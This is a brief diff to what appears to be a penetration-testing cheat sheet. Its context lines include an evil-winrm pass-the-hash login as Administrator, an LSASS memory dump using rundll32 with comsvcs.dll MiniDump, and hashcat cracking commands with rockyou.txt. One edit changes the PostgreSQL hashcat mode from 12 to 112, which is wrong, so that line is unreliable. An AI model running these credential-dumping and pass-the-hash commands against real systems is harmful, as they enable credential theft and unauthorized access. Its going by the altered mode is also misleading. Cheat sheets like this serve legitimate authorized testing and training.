@@ -52,7 +52,7 @@ evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
 ## Windows Local Credential Extraction
 
 ### Dump LSASS
-```powershell
+```
 rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```
 
@@ -168,7 +168,7 @@ hashcat -m 7401 mysql-new.txt rockyou.txt
 
 ### PostgreSQL
 ```
-hashcat -m 12 postgres.txt rockyou.txt
+hashcat -m 112 postgres.txt rockyou.txt
 ```
 
 ### bcrypt
